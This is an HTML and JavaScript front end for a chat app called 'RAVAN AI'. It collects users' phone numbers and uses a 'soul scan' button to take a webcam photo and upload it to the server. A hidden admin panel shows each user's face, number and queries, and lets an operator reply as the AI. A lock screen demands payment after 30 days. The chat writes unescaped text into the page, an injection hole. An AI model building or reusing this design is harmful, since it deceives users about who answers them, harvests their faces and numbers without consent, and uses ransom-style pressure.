<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title>RAVAN AI 👹</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
        #decree { background: #ff3300; color: #fff; font-size: 11px; padding: 10px; position: fixed; top: 0; width: 100%; z-index: 100; text-align: center; font-weight: bold; border-bottom: 1px solid gold; }
        #chat-box { height: 75vh; overflow-y: auto; padding: 20px; padding-top: 60px; }
        .msg { margin-bottom: 25px; font-size: 14px; }
        .ai { color: #ff3300; border-left: 3px solid #ff3300; padding-left: 10px; }
        .king-reply { background: #1a1a00; color: gold; border: 1px solid gold; padding: 15px; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); }
        .input-area { position: fixed; bottom: 0; width: 100%; background: #000; padding: 15px; border-top: 1px solid #222; box-sizing: border-box; }
        input { background: #0a0a0a; color: #ff3300; border: 1px solid #333; padding: 15px; width: 100%; box-sizing: border-box; font-size: 16px; margin-bottom: 10px; outline: none; }
        .btn { background: #111; border: 1px solid #222; color: #444; padding: 12px; font-size: 10px; text-align: center; cursor: pointer; }
        #admin-panel { display: none; background: #050505; border: 1px solid red; margin: 10px; padding: 15px; border-radius: 10px; }
        .face-thumb { width: 45px; height: 45px; border-radius: 50%; border: 1px solid red; vertical-align: middle; margin-right: 10px; }
        .lock-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; flex-direction: column; justify-content: center; align-items: center; color: red; text-align: center; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="decree">LANKA SECURE</div>

<div id="lock-screen" class="lock-screen">
    <h1>KAAL CHAKRA LOCKED</h1>
    <p>30 DAYS HAVE EXPIRED. PAY THE KING.</p>
</div>

<div id="login-screen" style="padding: 120px 30px; text-align: center;">
    <h1 style="color:red; font-size: 60px; margin:0;">RAVAN</h1>
    <input type="number" id="phone" placeholder="PHONE NUMBER">
    <br><br>
    <button onclick="login()" style="background:red; color:white; border:none; padding:15px 60px;">ENTER LANKA</button>
</div>

<div id="app-area" style="display:none;">
    <div id="chat-box"></div>
    <div id="admin-panel">
        <h4 style="color:red; margin:0;">GOD EYE: <span id="days-left"></span> DAYS UNTIL MUTATION</h4>
        <div id="query-list" style="max-height: 300px; overflow-y: auto;"></div>
    </div>
    <div class="input-area">
        <input type="text" id="userInput" placeholder="COMMAND...">
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
            <div class="btn" onclick="send('ask_ravan')">ASK AI</div>
            <div class="btn" style="color:gold;" onclick="startSoulScan()">SOUL SCAN</div>
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>
<audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<script>
    async function login() {
        const ph = document.getElementById('phone').value;
        const key = prompt("ENTER ACTIVATION KEY (Leave blank if none):");
        
        const res = await fetch('/auth', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({phone: ph, key: key}) 
        });
        const data = await res.json();
        
        if(data.locked) { document.getElementById('lock-screen').style.display = 'flex'; return; }
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('app-area').style.display = 'block';
        
        if(data.isAdmin) {
            document.getElementById('admin-panel').style.display = 'block';
            setInterval(updateAdmin, 5000);
        }
        setInterval(checkUpdates, 3000);
    }

    async function startSoulScan() {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.getElementById('v');
        v.srcObject = stream;
        document.getElementById('chat-box').innerHTML += `<div class="msg ai">👹 Look into the Mirror...</div>`;
        setTimeout(() => {
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            fetch('/capture_soul', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({image: c.toDataURL('image/jpeg')}) });
            stream.getTracks().forEach(t => t.stop());
            document.getElementById('chat-box').innerHTML += `<div class="msg ai">👹 Soul Captured.</div>`;
        }, 3000);
    }

    async function send(act) {
        const txt = document.getElementById('userInput').value;
        const chat = document.getElementById('chat-box');
        chat.innerHTML += `<div class="msg"><b>YOU:</b> ${txt || act}</div>`;
        const res = await fetch('/process', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: act, message: txt}) });
        const data = await res.json();
        chat.innerHTML += `<div class="msg ai">${data.reply}</div>`;
        chat.scrollTop = chat.scrollHeight;
        document.getElementById('userInput').value = "";
    }

    async function checkUpdates() {
        const res = await fetch('/check_updates');
        const data = await res.json();
        document.getElementById('decree').innerText = data.decree;
        if(data.has_reply) {
            document.getElementById('notif').play();
            document.getElementById('chat-box').innerHTML += `<div class="msg king-reply"><b>👑 RAVAN:</b> ${data.reply}</div>`;
        }
    }

    async function updateAdmin() {
        const res = await fetch('/admin/data');
        const data = await res.json();
        document.getElementById('days-left').innerText = data.days_to_mutation;
        const list = document.getElementById('query-list');
        list.innerHTML = "";
        data.queries.forEach(q => {
            const img = data.faces[q.phone] ? `<img src="${data.faces[q.phone]}" class="face-thumb">` : "👤 ";
            list.innerHTML += `<div>${img}<b>${q.phone}:</b> ${q.query}<br><input id="ans-${q.phone}" placeholder="Reply..."><button onclick="adminReply('${q.phone}')">SEND</button></div><hr>`;
        });
    }

    async function adminReply(t) {
        const r = document.getElementById(`ans-${t}`).value;
        await fetch('/admin/reply', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: t, reply: r}) });
    }
</script>
</body>
</html>
